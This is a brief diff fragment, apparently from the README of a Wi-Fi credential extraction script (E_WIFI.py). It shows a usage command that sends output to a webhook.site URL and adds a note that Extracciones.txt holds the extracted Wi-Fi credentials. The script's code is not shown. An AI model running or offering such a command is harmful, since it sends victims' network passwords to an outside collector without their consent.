@@ -54,3 +54,4 @@ python3 E_WIFI.py -u https://webhook.site/yoururl -o
 
 type --help for more detailed info
 
+PD: Extracciones.txt is the txt with the wifis credentials
